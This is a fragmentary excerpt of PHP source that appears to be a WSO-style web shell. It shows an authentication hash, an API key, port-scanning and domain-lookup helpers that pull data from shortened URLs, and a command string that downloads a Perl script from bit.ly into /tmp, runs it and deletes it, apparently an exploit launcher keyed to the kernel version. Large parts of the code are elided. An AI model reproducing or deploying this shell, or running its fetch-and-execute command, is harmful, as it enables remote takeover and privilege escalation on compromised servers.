...
$auth_pass = "1449c7f69905e68c271d69758c67e265"; 
...
try {
	...
	$vt_key = 'c8feb9f99bcb77119fbedb6efa6d75fd9d67ce4b5b0066f95abaa97f9488004d';
	$wsoExGentlyUrl = 'https://bit.ly/wsoExDef';
	...
	<input type=hidden name=p3>
		...
		$release = @php_uname('r');
		$kernel = @php_uname('s');
		$explink = 'curl -fskSL bit.ly/autork > /tmp/auto.pl; perl /tmp/auto.pl; rm -f /tmp/auto.pl;';
		...
		echo "
				...
				<script>
					...
					codeEditInit = function(s,u) {
						...
						u.rel = 'stylesheet';
						u.href = '//highlightjs.org/static/demo/styles/monokai-sublime.css';
	...
	function wsoGetOpenPorts() {
		...
		$db = wsoGetFile('https://bit.ly/jalurk7');
		$ports = explode(',', $ports);
		$open_ports = '';
	...
	function actionSecInfo() {
		...
		echo '<br>';
		preg_match('/"domains":\[(.+)\]/', wsoGetFile("http://bit.ly/geork"), $matches);
